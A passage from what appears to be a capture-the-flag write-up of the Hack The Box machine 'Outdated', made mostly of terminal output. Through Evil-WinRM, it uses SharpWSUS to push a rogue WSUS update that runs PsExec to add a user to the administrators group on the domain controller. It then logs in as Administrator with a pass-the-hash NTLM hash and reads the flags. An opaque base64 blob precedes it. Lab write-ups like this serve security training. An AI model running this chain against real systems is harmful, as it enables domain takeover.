d/ghnyDP6RbwPKrJ9ADXzu/YFAS1NLM8BWAza1tUwGJyZ2tdU3N7e317c1nW+ub2/d0Va/s6W9bWIiuHuqNdgGUGSAr7mhif4ADhuwuuFYz6j1E7B18tdJ911sa2hCNktusKroF3IjQf6p3eXUJmDVBNrEL5H7frjnbvok/o/h+ztP4vsjjh8+h+VOEIZHukeufObdk9U/KDi20Nt/0+TXv7udRtrVcTYZmo2ftSSg5WITLz87HIqEgomQXdoQn5qAY9+yKc9QPgAZXzd9S4fGu2Jmz6UQ/xwo/3B1KMS/RSpev66BwMHMZH5rLxfLMQCwsAo/h/DTWW/w+rA7Qzm9Ugot/Jks+B9E63rwaYC1brtmrZsm/QSur+OY0nWREYzgBnHex/l7JXRVk16f8vzkV4KO4aB5QEIerUa9urnsBK/j6iRFXReg1yZuNcrxI8Xw+nfdxesxzx0uoiG+NSQizHRKpxinyfprw7UcjQJWszzUaaKK1MWrWquLg7g3Zd2mlK+9tEZr/3NUxkfH+EqPVQD792ttU25x4qsZ45km6019lSB+6pcZbI6yx0MAfVCGbdX/6BKxvqli8ikZRciQoSwA7+dIS8X6ANtYJjYdMTNTEJIXdS5Y0qO5JX4HJb2w5FeNN5oT320s3yw3WrPItY3l6myTKt1U2e7mNuJKZ4hvlIq9xrXaffIfAP5ZU+qffOLTew9cmo0ELkrnWo0OuDoQkj8Qva96bLS3fnd1gH4XfioYiUVD+6rnQ4nqA/uLC4oL9gbl71sHkEQ0sa96zox2JCZnQrPBRP1seNKMJWLnk/WTsdmOYGK24WJzdWA2GA2fDyWSJ/T+kFggYBHrnwpFk+HkvIMn+qsO0G+o76semO+MxyNh8SPHDcF4vLpRUEiac4kk/Y5wjvy0iJ6xZUL++qeEscQM3TKHfIamhszwxXAkNB1K5Ei1tdqiotMRvyCMHB8NXQxFAhFK91UHE/3Ri7ELIbM6MBcWPzm7r/p8MJIIyUExkcYM3CjWGx287220hIDw3kYl1P3w4r2+gUs3ftyx40Xs4/+/fmdf/xdSYBHsAMAAAA==
```

```
*Evil-WinRM* PS C:\temp> ./sharp.exe create /payload:"C:\temp\PsExec64.exe" /args:"-accepteula -s
 -d cmd.exe /c \"net localgroup administrators sflowers /add\"" /title:"rogue"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PsExec64.exe
[*] Payload Path: C:\temp\PsExec64.exe
[*] Arguments: -accepteula -s -d cmd.exe /c \net
[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c \net

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 30
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 31
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:04f25b66-446a-4a4e-bec0-ea03876a2d82 /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:04f25b66-446a-4a4e-bec0-ea03876a2d82 /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:04f25b66-446a-4a4e-bec0-ea03876a2d82 /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete
```
```
*Evil-WinRM* PS C:\temp> ./SharpWSUS.exe approve /updateid:c793cbdf-526a-4381-8b50-1aab62c92363 /computername:dc.outdated.htb /groupname:"rogue1"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
Group Exists = False
Group Created: rogue1
Added Computer To Group
Approved Update

[*] Approve complete

*Evil-WinRM* PS C:\temp>
```

```
*Evil-WinRM* PS C:\temp> ./SharpWSUS.exe check /updateid:c793cbdf-526a-4381-8b50-1aab62c92363 /computername:dc.outdated.htb

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Check Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1

[*] Update is installed

[*] Check complete

*Evil-WinRM* PS C:\temp> 
```

└──╼ [★]$ evil-winrm -i 10.129.56.140 -u Administrator -H 716f1ce2e2cf38ee1210cce35eb78cb6
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat /users/sflowers/Desktop/user.txt
81113c27e92*********************

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
88225924900*********************